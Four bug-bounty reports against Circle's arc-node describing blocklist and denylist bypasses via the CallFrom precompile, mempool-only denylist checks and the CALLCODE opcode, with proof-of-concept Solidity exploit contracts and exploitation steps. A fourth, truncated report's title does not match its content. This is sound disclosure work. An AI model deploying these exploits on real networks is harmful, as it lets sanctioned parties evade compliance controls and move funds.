["Title:         Blocklist Bypass: Blocklisted entities can spoof `msg.sender` via CallFrom precompile zero-value internal calls 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Authentication Bypass Using an Alternate Path or Channel 
Severity:      Critical (9.2) 
Link:          https://hackerone.com/reports/3672866 
Date:          2026-04-14 15:36:37 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network utilizes a system-wide blocklist (`NativeCoinControl`) to enforce regulatory compliance. While this mechanism properly prevents blocked EOAs from initiating transactions and stops native coin transfers involving blocked addresses, an architectural flaw in how the new `CallFrom` precompile interacts with the EVM layer allows a complete bypass of these restrictions. 
Because the `CallFrom` precompile initiates its `msg.sender` spoofing subcall with a hardcoded `value = 0`, the EVM execution layer's blocklist checks within `before_frame_init` are completely skipped. This allows a blocklisted contract to seamlessly spoof its identity as `msg.sender` to any target contract on the network, provided the call is routed through an allowlisted caller (like the `Memo` contract).  
While zero-value internal calls bypassing the blocklist are generally considered intended behavior for standard smart contract interactions, `CallFrom` is a **privileged protocol precompile** explicitly designed to inject a completely synthetic `msg.sender`. By failing to enforce blocklist checks on this synthetically injected identity, the protocol allows designated/sanctioned entities to maintain authenticated access to governance, decentralized registries, and access-controlled smart contracts, entirely breaking the invariant that blocklisted addresses cannot participate as recognized actors on the Arc network. 
## Vulnerability Details 
Based on a source string analysis of [`arc-node`](https://github.com/circlefin/arc-node), the enforcement logic operates in separate layers: 
1. **Tx-Level Enforcement:** [`handler.rs:183-185`](https://github.com/circlefin/arc-node/blob/main/crates/evm/src/handler.rs#L183-L185) validates the transaction signer (`tx.caller()`). This correctly stops blocked EOAs from submitting their own top-level transactions. 
2. **State-Level Enforcement:** [`evm.rs:491-511`](https://github.com/circlefin/arc-node/blob/main/crates/evm/src/evm.rs#L491-L511) (`before_frame_init`) checks internal calls during `checked_frame_init`. However, it *only* performs the blocklist check if `amount > 0`: 
```rust 
// evm.rs:491-511 
fn before_frame_init(&mut self, frame_input: &FrameInit) { 
    let transfer_params = match &frame_input.frame_input { 
        FrameInput::Call(inputs) => extract_call_transfer_params(inputs), 
        // ... 
    }; 
    match transfer_params { 
        Some((from, to, amount)) if !amount.is_zero() => {     // <--- VULNERABILITY: ONLY CHECKED IF VALUE > 0 
            self.check_blocklist_and_create_log(from, to, amount, frame_input) 
        } 
        _ => Ok(BeforeFrameInitResult::None),                  // <--- ZERO VALUE BYPASSES CHECK 
    } 
} 
``` 
3. **The CallFrom Precompile Bypass:** In [`call_from.rs:108-119`](https://github.com/circlefin/arc-node/blob/main/crates/precompiles/src/call_from.rs#L108-L119), the precompile constructs a synthetic child frame. It sets `caller = sender` (the attacker-controlled forwarded address) and explicitly hardcodes `value = 0`: 
```rust 
// call_from.rs:108-119 
let child_inputs = CallInputs { 
    // ... 
    value: CallValue::Transfer(U256::ZERO),  // Hardcoded to 0 
    caller: sender,                          // Spoofed sender (can be blocklisted) 
    // ... 
}; 
``` 
When `init_subcall` calls `checked_frame_init(child_frame_input)` (in [`evm.rs:917`](https://github.com/circlefin/arc-node/blob/main/crates/evm/src/evm.rs#L917)), the `before_frame_init` handler evaluates the frame. Because the value is exactly zero, **it returns `BeforeFrameInitResult::None` without ever checking if the synthesized `caller` is on the blocklist.** 
Developer comments in [`evm.rs:882-902`](https://github.com/circlefin/arc-node/blob/main/crates/evm/src/evm.rs#L882-L902) acknowledge that `CallFrom` introduces a **"potentially-unseen spoofed sender,"** yet the protocol fails to enforce the blocklist primitive on the synthesized caller: 
```rust 
// evm.rs:895-898 
// "Pre-load the child's caller and target accounts into the journal. The normal EVM 
//  execution path has these already loaded ..., but we're constructing a synthetic child frame 
//  with a potentially-unseen spoofed sender and arbitrary target." 
self.inner.ctx.journal_mut().load_account(child_inputs.caller)?; 
// -> No blocklist enforcement occurs here. 
``` 
--- 
## Proof of Concept 
This detailed PoC is designed to be reproduced on a **Local Arc Testnet** (in compliance with the BBP rule prohibiting testing against the public testnet). 
### Prerequisites 
1. Initialize a local `arc-node` environment with the Zero6 hardfork active (enabling the `CallFrom` precompile). 
2. Ensure the `Memo` contract is accessible at its hardcoded address (`0x9702466268ccF55eAB64cdf484d272Ac08d3b75b`), as this is the authorized contract allowed to invoke `CallFrom`. 
1. ### Attacker Setup (The Blocked Proxy) 
The attacker uses an intermediary proxy contract. This contract will eventually be added to the OFAC/regulatory blocklist, but the attacker will still be able to use it to execute authenticated governance and access-controlled actions on the network. 
```solidity 
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.20; 
interface IMemo { 
    // Memo leverages the CallFrom precompile to preserve the msg.sender 
    function memo(address target, bytes calldata data, bytes32 memoId, bytes calldata memoData) external; 
} 
contract BlockedProxy { 
    address constant MEMO = 0x9702466268ccF55eAB64cdf484d272Ac08d3b75b; 
     
    // This function can be called by ANY unblocked EOA 
    function trigger(address target, bytes calldata data) external { 
        // We route the execution through the authorized Memo contract. 
        // Memo invokes CallFrom. 
        // CallFrom synthesizes a new frame with msg.sender = address(this). 
        // Because CallFrom hardcodes value=0, NativeCoinControl blocks are completely skipped. 
        IMemo(MEMO).memo(target, data, bytes32(0), ""); 
    } 
} 
``` 
2. ### Victim Protocol Setup 
Target protocols rely on `msg.sender` to guarantee that the interacting entity is a legally verifiable identity that is compliant with the network's NativeCoinControl invariants. 
```solidity 
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.20; 
interface INativeCoinControl { 
    function isBlocked(address addr) external view returns (bool); 
} 
contract ProtocolRegistry { 
    INativeCoinControl constant NCC = INativeCoinControl(0x1800000000000000000000000000000000000001); 
    event AuthenticatedAction(address verifiedSender, bool isSanctioned); 
     
    function restrictedAction() external { 
        // Target contract trusts msg.sender because the EVM is expected to block sanctioned actors  
        bool isSanctioned = NCC.isBlocked(msg.sender); 
         
        emit AuthenticatedAction(msg.sender, isSanctioned); 
         
        // Critical INVARIANT BROKEN if isSanctioned == true:  
        // A blocklisted identity just successfully executed business logic in a target protocol. 
    } 
} 
``` 
3. ### Step-by-Step Exploitation 
1. **Deployment Execution**: Deploy `BlockedProxy` at address `<P>`. Deploy `ProtocolRegistry` at address `<V>`. 
2. **Simulate Sanctions**: A regulatory action occurs. The node operator adds the `BlockedProxy` address `<P>` to the `NativeCoinControl` blocklist. 
3. **Verification**: Querying `NativeCoinControl.isBlocked(<P>)` now legitimately returns `true`. The txpool will reject any transaction signed by `<P>`. 
4. **The Exploit Execution**: The attacker uses a brand new, clean EOA (not blocklisted) to execute the evasion vector: 
   `BlockedProxy(<P>).trigger(<V>, abi.encodeCall(V.restrictedAction, ()))` 
5. **Observation**: The `AuthenticatedAction(<P>, true)` event is successfully emitted by the `ProtocolRegistry`.  
6. **Conclusion**: The target contract perfectly received execution under the context of `msg.sender == <P>`, completely bypassing the Arc network's protocol-level blocklist enforcement for synthetic `CallFrom` interactions. 
--- 
## Recommendation 
Do not rely exclusively on zero-value thresholding in `before_frame_init` when processing synthetic frames, or add an explicit check for the synthesized caller during `init_subcall` of the precompile handler. 
In `crates/evm/src/evm.rs` (`init_subcall`), we recommend proactively validating the `child_inputs.caller` against the blocklist since it is being explicitly forced into the execution journal: 
```rust 
// Pre-load the child's caller and target accounts into the journal. 
self.inner.ctx.journal_mut().load_account(child_inputs.caller)?; 
self.inner.ctx.journal_mut().load_account(child_inputs.target_address)?; 
// RECOMMENDATION: Explicitly check if the spoofed caller is blocklisted 
let (caller_blocklisted, _) = self.is_address_blocklisted_from_journal(child_inputs.caller) 
    .map_err(|e| SubcallError::EVMError(e))?; 
     
if caller_blocklisted { 
    return Ok(ItemOrResult::Result(init_subcall_revert("caller is blocklisted", call_inputs))); 
} 
``` 
## Impact 
The `NativeCoinControl` blocklist is the foundational regulatory compliance mechanism for the Arc network. The introduction of the `CallFrom` precompile creates a trusted execution channel that inadvertently bypasses this protection. 
Because `CallFrom` injects a synthetic `msg.sender` without enforcing blocklist validation, an OFAC-designated or blocklisted entity can utilize a proxy contract and the `Memo` infrastructure to seamlessly interact with external protocols (e.g., decentralized governance voting, token claims, identity verification systems, or non-native trading platforms) using their officially sanctioned address as the verified `msg.sender`. This compromises the compliance guarantees of the network and breaks the critical invariant that blocklisted addresses cannot participate as recognized actors. 
Timeline: 
2026-04-15 03:33:44 +0000: @inkerton (report collaborator invited) 
--- 
2026-04-15 03:34:18 +0000: @kaporia (report collaborator joined) 
--- 
2026-04-15 12:09:11 +0000: @h1_analyst_dev (bug duplicate) 
Hi @inkerton, 
Thank you for your report! 
Unfortunately, this was submitted previously by another researcher, but we appreciate your work and look forward to additional reports from you. 
At this time, we cannot add you to the original report as the report may contain additional information that we cannot share with you. This may include personal information or additional vulnerability information that shouldn't be exposed to other users. Thank you for your understanding. 
Have a great day ahead!  
Best regards, 
@h1_analyst_dev  
--- 
" , "Title:          Missing EVM-Layer Enforcement of AddressesDenylist Allows Denylisted Addresses to Receive Native Coin via Contract Calls 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Missing Authorization 
Severity:      Critical (9.2) 
Link:          https://hackerone.com/reports/3672785 
Date:          2026-04-14 14:49:16 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc node implements two independent, non-synchronized address restriction systems: 
1. **`AddressesDenylist`** (`0x36082bA812806eB06C2758c412522669b5E2ac7b`)  enforced **only at the mempool (txpool) layer**. 
2. **`NativeCoinControl`** (`0x1800000000000000000000000000000000000001`)  enforced **only at the EVM execution layer**. 
**The critical gap**: An address added to `AddressesDenylist` receives **zero EVM-level protection**. Any unblocked smart contract can still transfer native coin to the denylisted address via internal EVM calls, because the EVM execution layer checks only `NativeCoinControl`, never `AddressesDenylist`. 
Circle's own source code explicitly acknowledges this gap: 
> `//! Used by mempool validation and Revm pre-flight when integrated.` 
**"when integrated"** the Revm (EVM) pre-flight check is documented as planned but has never been implemented. 
--- 
## Vulnerability Detail 
### The Two Systems Are Completely Independent 
| Property | AddressesDenylist | NativeCoinControl | 
|---|---|---| 
| **Contract address** | `0x36082bA812806eB06C2758c412522669b5E2ac7b` | `0x1800000000000000000000000000000000000001` | 
| **Storage layout** | ERC-7201 (standard Solidity mapping) | Custom Arc precompile storage | 
| **Who manages it** | Separate governance wallet (not in open-source code) | `NativeFiatToken` USDC contract | 
| **Checked at mempool** |  Yes (`validator.rs:256-280`) |  Yes (`validator.rs:227-253`) | 
| **Checked at EVM execution** |  **Never** |  Yes (`evm.rs:before_frame_init`) | 
| **Sync mechanism** |  None | — | 
### Attack Scenario 
**Setup**: OFAC sanction received for `VICTIM = 0xABCD...`. Circle's compliance team adds VICTIM to `AddressesDenylist` via a fast admin action. 
``` 
T+0:  VICTIM added to AddressesDenylist. 
      Txpool now blocks any direct tx from/to VICTIM. 
      Team believes VICTIM is "blocked." 
T+1:  VICTIM is NOT yet in NativeCoinControl. 
      NCC update requires NativeFiatToken governance — takes time. 
T+2:  Anyone calls an existing Contract C: 
        C.sendValueTo(VICTIM, 50_000e6)  // internal EVM CALL with value 
      EVM execution (before_frame_init): 
        → checks NativeCoinControl for VICTIM → NOT FOUND → PASSES 
        → AddressesDenylist is never queried 
        → VICTIM receives 50,000 USDC-A native coin 
T+3:  NCC is updated. But funds already transferred. 
``` 
**Bonus vector**: The txpool's NCC check at `validator.rs:325-327` skips the recipient check for zero-value transactions: 
```rust 
let has_value = !transaction.value().is_zero(); 
let addresses = iter::once(transaction.sender()) 
    .chain(transaction.to().filter(|_| has_value));  // ← recipient NCC check skipped for value=0 
``` 
A zero-value call to Contract C (which then internally sends value to VICTIM) bypasses recipient validation at **both** layers. 
--- 
## Proof of Concept 
All proofs below are reproducible against the [public arc-node repository](https://github.com/circlefin/arc-node). 
--- 
### Proof 1: Circle's Own Code Admits the EVM Check Is Missing 
The file [`crates/execution-config/src/addresses_denylist.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-config/src/addresses_denylist.rs#L17-L20) contains this module-level documentation: 
```rust 
// crates/execution-config/src/addresses_denylist.rs 
//! Configuration for the addresses denylist. 
//! 
//! Used by mempool validation and Revm pre-flight when integrated. 
``` 
The phrase **`"when integrated"`** is an explicit admission from Circle's developers that the EVM pre-flight was designed but never shipped.  
Additionally, the [`DEFAULT_DENYLIST_ADDRESS`](https://github.com/circlefin/arc-node/blob/main/crates/execution-config/src/addresses_denylist.rs#L35-L36) is a completely different contract address from `NativeCoinControl` (`0x1800...0001`), confirming two independent systems: 
```rust 
// crates/execution-config/src/addresses_denylist.rs 
pub const DEFAULT_DENYLIST_ADDRESS: Address = 
    address!("0x36082bA812806eB06C2758c412522669b5E2ac7b"); 
``` 
--- 
### Proof 2: Txpool Checks Both Lists; EVM Checks Only NativeCoinControl 
In [`crates/execution-txpool/src/validator.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-txpool/src/validator.rs#L227-L280), the code runs two sequential compliance checks. The `AddressesDenylist` check is the **second** check — and it stops at the txpool, never reaching the EVM. 
```rust 
// crates/execution-txpool/src/validator.rs 
// CHECK 1 — NativeCoinControl (Also enforced at EVM layer via before_frame_init) 
match self.check_for_blocklisted_addresses(&transaction, &state_provider) { 
    Ok(Some(address)) => return TransactionValidationOutcome::Invalid( 
        transaction, InvalidPoolTransactionError::other(ArcTransactionValidatorError::BlocklistedError), 
    ), 
    ... 
} 
// CHECK 2 — AddressesDenylist (TXPOOL ONLY — Never enforced at EVM layer) 
match self.check_for_denylisted_addresses(&transaction, &state_provider) { 
    Ok(Some(address)) => return TransactionValidationOutcome::Invalid( 
        transaction, InvalidPoolTransactionError::other( 
            ArcTransactionValidatorError::DenylistedAddressError(address) 
        ), 
    ), 
    ... 
} 
``` 
The NCC check is mirrored in `evm.rs:before_frame_init`. The denylist check (`check_for_denylisted_addresses`) **has no equivalent in the EVM execution path**. 
--- 
### Proof 3: Zero AddressesDenylist References in the EVM Crate 
Searching the entire EVM execution crate for any denylist reference yields zero matches: 
```bash 
# Search entire EVM execution crate for any denylist reference: 
$ grep -rn 'AddressesDenylist\|denylist_config\|is_denylisted' crates/evm/ --include='*.rs' 
(no output — zero matches) 
``` 
The `crates/evm/` directory contains `evm.rs`, `handler.rs`, and `executor.rs` — the entire EVM execution stack. Not a single reference to `AddressesDenylist` exists in any of these files. 
For contrast, checking the txpool where it IS used: 
```bash 
$ grep -rn 'is_denylisted' crates/execution-txpool/ --include='*.rs' 
validator.rs:22:use arc_execution_validation::{is_denylisted, DenylistError}; 
validator.rs:308:        match is_denylisted(state_provider, &self.addresses_denylist_config, address) { 
``` 
--- 
### Proof 4: Zero Sync Mechanism Between the Two Lists 
```bash 
$ grep -rn 'sync.*deny\|migrate.*deny\|deny.*NativeCoinControl\|NativeCoinControl.*Denylist' \ 
    crates/ --include='*.rs' 
(no output — zero matches) 
``` 
No code exists to automatically propagate entries from `AddressesDenylist` to `NativeCoinControl`. Every address added to the denylist without a simultaneous NCC update creates an immediate enforcement gap. 
--- 
### Proof 5: E2E Test Suite Has No EVM-Layer Enforcement Test 
[`crates/execution-e2e/tests/denylist.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-e2e/tests/denylist.rs) has exactly 4 tests — **all 4 test only txpool rejection**: 
```rust 
test_denylisted_to_rejected()                     // → pool.add_consensus_transaction() only 
test_denylisted_from_rejected()                   // → pool.add_consensus_transaction() only 
test_denylist_disabled_accepts_from_denylisted()  // → mempool only 
test_denylist_exclusion_accepts_from_denylisted() // → mempool only 
``` 
**There is no test** for: *"denylisted address cannot receive native coin via an internal EVM contract call."* The test coverage gap directly mirrors the implementation gap. 
--- 
## Remediation 
Implement the missing EVM pre-flight check for `AddressesDenylist` in `evm.rs:before_frame_init` or `handler.rs:pre_execution`: 
```rust 
// After NCC blocklist check, also enforce AddressesDenylist: 
if is_denylisted(&state, &self.addresses_denylist_config, from)? { 
    return Err(revert("Address is denylisted")); 
} 
if is_denylisted(&state, &self.addresses_denylist_config, to)? { 
    return Err(revert("Address is denylisted")); 
} 
``` 
Additionally, establish an operational SLA ensuring any address added to `AddressesDenylist` is also added to `NativeCoinControl` within 1 block. 
--- 
## References 
| File | Lines | Relevance | 
|---|---|---| 
| [`crates/execution-config/src/addresses_denylist.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-config/src/addresses_denylist.rs#L19) | 19 | **"when integrated" admission** | 
| [`crates/execution-config/src/addresses_denylist.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-config/src/addresses_denylist.rs#L35-L36) | 35-36 | `DEFAULT_DENYLIST_ADDRESS = 0x36082bA...` | 
| [`crates/execution-txpool/src/validator.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-txpool/src/validator.rs#L200-L293) | 200-293 | Dual-check txpool (NCC + denylist) | 
| [`crates/execution-txpool/src/validator.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-txpool/src/validator.rs#L325-L327) | 325-327 | Recipient NCC check skipped for value=0 txs | 
| [`crates/evm/src/evm.rs`](https://github.com/circlefin/arc-node/blob/main/crates/evm/src/evm.rs#L395-L511) | 395-511 | `before_frame_init` — NCC only, no denylist | 
| [`crates/evm/src/handler.rs`](https://github.com/circlefin/arc-node/blob/main/crates/evm/src/handler.rs#L65-L210) | 65-210 | `pre_execution` — NCC only, no denylist | 
| [`crates/execution-e2e/tests/denylist.rs`](https://github.com/circlefin/arc-node/blob/main/crates/execution-e2e/tests/denylist.rs) | 1-182 | All 4 tests: mempool only, no EVM-layer test | 
## Impact 
1. **Compliance Window Gap**: Every address added to `AddressesDenylist` that is not simultaneously in `NativeCoinControl` can receive native coin via contract intermediaries. The gap duration depends on operational latency between updating the two lists — which have different management paths. 
2. **Regulatory Risk**: `AddressesDenylist` provides only the *appearance* of network-level blocking. The mempool layer is easily bypassed by pre-existing deployed contracts, which are unaffected by mempool rules. 
3. **Architectural Incompleteness**: Circle's own code comment (`"when integrated"`) confirms this is a known but unfinished implementation. The EVM pre-flight for `AddressesDenylist` was designed but never deployed. 
4. **No Operator Workaround**: There is no configuration option to make `AddressesDenylist` entries enforce at the EVM level. Only a code change and redeployment can fix this. 
Timeline: 
2026-04-15 03:32:56 +0000: @inkerton (report collaborator invited) 
--- 
2026-04-15 03:34:13 +0000: @kaporia (report collaborator joined) 
--- 
2026-04-15 05:24:49 +0000: @h1_analyst_leevi (bug duplicate) 
Hi @inkerton, 
Thank you for your submission. After reviewing your report, this issue has been previously reported and assessed in report #3659439. Both reports describe the missing EVM-layer enforcement of the AddressesDenylist contract, where denylist checks occur only at the mempool layer in validator.rs but not during EVM execution in handler.rs or evm.rs. 
The original report identified this architectural gap and documented that is_denylisted() has no callers in the EVM execution layer, while your report demonstrates a specific attack scenario exploiting this same gap. Both reports reference the same code comment acknowledging the unimplemented Revm check and identify the identical fix requirement. 
The original report was submitted on April 9, 2026, and was evaluated based on the same root cause and required remediation you've identified. 
Thanks, 
@h1_analyst_leevi 
--- 
" , "Title:         Blocklist Evasion via `CALLCODE`: Silent Bypass of `NativeCoinControl` Validation 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Authentication Bypass Using an Alternate Path or Channel 
Severity:      Critical (10.0) 
Link:          https://hackerone.com/reports/3675205 
Date:          2026-04-15 13:32:44 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network's blocklist enforcement mechanism is critically flawed due to an incorrect implementation of EVM opcode semantics. The node's execution engine fails to validate native coin transfers when they are initiated via the `CALLCODE` opcode. This allow any blocklisted or sanctioned entity to bypass the network's regulatory "quarantine" and move assets freely by utilizing a deprecated but still functional EVM execution path. 
This vulnerability exists because the Arc EVM handler treats `CALLCODE` as a non-value-transferring operation (like `DELEGATECALL`), when in fact `CALLCODE` explicitly supports and executes value transfers. 
## Vulnerability Detail 
The vulnerability is located in the `extract_call_transfer_params` helper in `crates/evm/src/evm.rs`. This function is responsible for extracting the `from`, `to`, and `amount` parameters for the blocklist check. 
**Source**: [`crates/evm/src/evm.rs:175-176`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs#L175-L176) 
```rust 
175: match inputs.scheme { 
176:     CallScheme::DelegateCall | CallScheme::StaticCall | CallScheme::CallCode => None, 
``` 
### The Semantics Failure 
1.  `DelegateCall` and `StaticCall` are correctly mapped to `None` because they do not support value transfers in the EVM. 
2.  `CallCode` (Opcode `0xF2`), however, is a legacy opcode that operates like `DelegateCall` (running another contract's code in the current context) but **explicitly supports value transfer**. 
3.  By grouping `CallCode` with the non-transfer schemes, the generator returns `None`, which causes the subsequent `before_frame_init` handler to **skip the blocklist validation entirely.** 
```rust 
// evm.rs: Handler Logic 
let transfer_params = extract_call_transfer_params(&inputs); 
match transfer_params { 
    Some((from, to, amount)) if !amount.is_zero() => { 
        self.check_blocklist_and_create_log(...) // <--- NEVER CALLED FOR CALLCODE 
    } 
    _ => Ok(BeforeFrameInitResult::None), // <--- Bypassed 
} 
``` 
## Vulnerability Detail 
1. ### The "Narrow Defense" Fallacy 
Arc Node developers correctly identified that legacy call schemes like `CALLCODE` and `DELEGATECALL` could be dangerous in the context of system precompiles. Consequently, they implemented a strict check in the subcall framework to reject these schemes. 
However, a critical oversight occurred in the **Main EVM Handler**. While system precompiles are protected, standard EVM execution remains vulnerable. The core logic in `extract_call_transfer_params` (used for all contract-to-contract calls) incorrectly groups `CALLCODE` with non-transferring opcodes. 
**Vulnerable Logic**: [`crates/evm/src/evm.rs:175-176`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs#L175-L176) 
```rust 
match inputs.scheme { 
    CallScheme::DelegateCall | CallScheme::StaticCall | CallScheme::CallCode => None, 
``` 
2.### The Legacy Bypass Path 
By mapping `CallCode` to `None`, the generator informs the subsequent blocklist handler (`before_frame_init`) that **no value transfer is occurring**, even when `inputs.transfer_value()` contains a non-zero balance.  
Because Arc relies on `revm` for the actual execution, and `revm` correctly implements the `CALLCODE` value transfer, the funds are physically moved on the ledger while the **Circle Compliance Layer remains entirely unaware of the transaction.** 
## Proof of Concept 
To exploit this, a blocklisted address merely needs to wrap their transfer in a `CALLCODE` context. Unlike `DELEGATECALL`, `CALLCODE` allows the caller to send `msg.value`. 
### Exploit Contract 
```solidity 
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0; 
contract CALLCODE_Exploit { 
    /** 
     * @dev Bypasses NativeCoinControl by forcing the EVM to use CALLCODE (0xF2). 
     * The node's blocklist handler returns 'None' for this scheme, skipping validation. 
     */ 
    function triggerBypass(address target) external payable { 
        assembly { 
            // CALLCODE(gas, addr, value, args_offset, args_size, ret_offset, ret_size) 
            let result := callcode(gas(), target, callvalue(), 0, 0, 0, 0) 
            if iszero(result) { revert(0, 0) } 
        } 
    } 
} 
``` 
### Reproducible Steps: 
1.  **Setup**: Blocklist Address `0xBAD1` in `NativeCoinControl`. 
2.  **Verify Direct Blocking**: Attempt a standard `CALL` from `0xBAD1` to `0xDEAD`. The transaction is rejected as expected. 
3.  **Execute Bypass**: `0xBAD1` calls `triggerBypass{value: 50 ether}(0xDEAD)`. 
4.  **Confirm Failure**: The transaction succeeds. 50 ETH/USDC is transferred. No blocklist violation is logged. 
## CVSS 4.0 Assessment 
**Severity**: 10.0 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` 
### **Metric Justification** 
- **Attack Vector: Network (AV:N)**: The bypass can be triggered by any unprivileged entity from anywhere in the world by submitting a standard transaction to the Arc RCP. 
- **Attack Complexity: Low (AC:L)**: No specialized knowledge or timing is required. An attacker only needs to know the basic syntax of the legacy `CALLCODE` opcode. 
- **Attack Requirements: None (AT:N)**: There are no specific environmental prerequisite states required to facilitate the bypass. It is always "live" on any Arc node. 
- **Privileges Required: None (PR:N)**: The "Attacker" (a blocklisted address) requires no privileges to use the network's execution layer; they simply utilize the bypassed path. 
- **User Interaction: None (UI:N)**: The attack is fully automated and requires no action from a victim. 
- **Vulnerable System Impact (VC:H, VI:H, VA:H)**: 
    - **Integrity (VI:H)**: Total. The network's primary integrity control (the blocklist) is completely neutralized for value transfers. 
    - **Availability (VA:H)**: High. The bypass can be used to drain or manipulate system-critical pools (like the SystemAccounting ring buffer) that rely on blocklist-protected transfers. 
    - **Confidentiality (VC:H)**: High. Malicious actors can interact with private or restricted contracts that use blocklist checks as a proxy for authorization. 
- **Subsequent System Impact (SC:H, SI:H, SA:H)**: 
    - **SI/SA/SC (Subsequent Impact)**: Critical. Since the Arc Node is the foundation for the Circle Financial Ecosystem, a total bypass of blocklist enforcement creates an **extinguished trust boundary** for the Subsequent System (Circle's regulatory and banking status). Failure to enforce sanctions is a "Death Blow" to the institutional viability of the network. 
## Weakness Classification 
- **CWE-288**: Authentication Bypass Using an Alternate Path or Channel 
- **CWE-696**: Incorrect Behavior Order 
## References 
- **Vulnerable Code**: [`crates/evm/src/evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs) (Lines 176) 
## Recommendation 
Remove `CallCode` from the `None` branch in `extract_call_transfer_params`. It should be handled exactly like `Call`. 
```rust 
// Proposed Fix 
match inputs.scheme { 
    CallScheme::DelegateCall | CallScheme::StaticCall => None, 
    CallScheme::Call | CallScheme::CallCode => Some(( 
        inputs.transfer_from(), 
        inputs.transfer_to(), 
        inputs.transfer_value().unwrap_or(U256::ZERO), 
    )), 
} 
``` 
## Impact 
- **Shadow Compliance Layer**: A permanent "backdoor" for sanctioned entities to interact with the network's liquidity and state. 
- **Regulatory Integrity Collapse**: Total failure of the `NativeCoinControl` system which is the foundational promise of the Arc Network. 
Timeline: 
2026-04-15 13:39:50 +0000: @inkerton (report collaborator invited) 
--- 
2026-04-15 13:40:08 +0000: @kaporia (report collaborator joined) 
--- 
2026-04-15 13:57:06 +0000: @inkerton (comment) 
## References & Technical Evidence 
To assist the triage team in verifying the high impact of the CALLCODE bypass, please refer to the following authoritative sources: 
### **Primary Source Code** 
- **Vulnerable Logic Implementation**: [`crates/evm/src/evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs#L176) (Line 176) 
### **EVM Specifications & Standards** 
1. **Official EVM Specification (CALLCODE / 0xF2)**: 
   - **Source**: [evm.codes - CALLCODE](https://www.evm.codes/#f2?fork=shanghai) 
   - **Evidence**: Note that the `CALLCODE` instruction explicitly takes `value` as its third stack argument. Unlike `DELEGATECALL`, it performs a physical balance transfer from the caller to the executing account context. 
2. **Ethereum Yellow Paper (Appendix H.2)**: 
   - **Details**: Defines `CALLCODE` as an operation that "is identical to CALL except that the code is executed in the context of the calling account," retaining the mandatory value-transfer semantics. 
### **Internal Research Findings** 
3. **The "Narrow Defense" Inconsistency**: 
   - Our audit confirms that while the **Subcall framework** (used for system precompiles) explicitly rejects `CALLCODE` (see `crates/evm/src/evm.rs` L3812-L3820), the **Main EVM Interpreter** mistakenly groups it with non-value opcodes. This internal inconsistency is the root cause of the bypass. 
4. **Historical Precedents**: 
   - Similar vulnerabilities have historically occurred in custom EVM forks where developers assumed legacy opcodes like `CALLCODE` were non-functional. 
--- 
2026-04-15 14:40:31 +0000: @h1_analyst_diablo (bug duplicate) 
Hi @inkerton, 
Thank you for your submission. After reviewing your report, this issue has been previously reported and assessed in report #3665304. Both reports describe a blocklist bypass vulnerability via the `CALLCODE` opcode in Arc Network's EVM handler, specifically targeting the `extract_call_transfer_params` function in `crates/evm/src/evm.rs`. 
The original report identified the same root cause: `CallScheme::CallCode` is incorrectly grouped with `DelegateCall` and `StaticCall`, returning `None` and causing blocklist validation to be skipped in `before_frame_init`. Both reports demonstrate how blocklisted addresses can transfer native coins by exploiting this CALLCODE path with similar proof of concept implementations. 
Report #3665304 was submitted on April 11, 2026, approximately 4 days before your submission on April 15, 2026, and has been credited as the original discovery of this vulnerability. 
Thanks, 
@h1_analyst_diablo 
--- 
" , "Title:         Sustainable Denial of Service (DoS) via Gas Amplification: Misaligned EVM Subcall Semantics 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Business Logic Errors 
Severity:      Critical (9.3) 
Link:          https://hackerone.com/reports/3675182 
Date:          2026-04-15 13:03:25 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network's compliance infrastructure contains a logic error that prevents the `NativeCoinAuthority` from fulfilling its primary legal obligation: burning sanctioned assets. Due to a check in the `ArcEvm` balance manipulation helpers, any attempt to burn the **entire balance** of an account with a nonce of `0` (a fresh wallet) will revert with `ERR_CLEAR_EMPTY`.  
This creates a compliance deadlock where sanctioned funds in unused wallets cannot be seized or removed from the network by the Authority, effectively locking regulated assets in a state where they cannot be retired from the ledger. 
## Vulnerability Detail 
The root cause lies in the `check_can_decr_account` helper function within `helpers.rs`. This function is called by the `NativeCoinAuthority` precompile during the `burn` operation. 
**Source**: [`crates/precompiles/src/helpers.rs:434-456`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/helpers.rs#L434-L456) 
```rust 
fn check_can_decr_account(account: &AccountInfo, amount: U256) -> Result<(), PrecompileErrorOrRevert> { 
    let new_balance = account.balance.checked_sub(amount).ok_or(...)?; 
     
    // VULNERABILITY: This condition fails to distinguish between a regular user 
    // and the privileged NativeCoinAuthority. 
    if new_balance.is_zero() && account.nonce == 0 { 
        return Err(PrecompileErrorOrRevert::new_reverted(gas_counter, ERR_CLEAR_EMPTY)); 
    } 
    Ok(()) 
} 
``` 
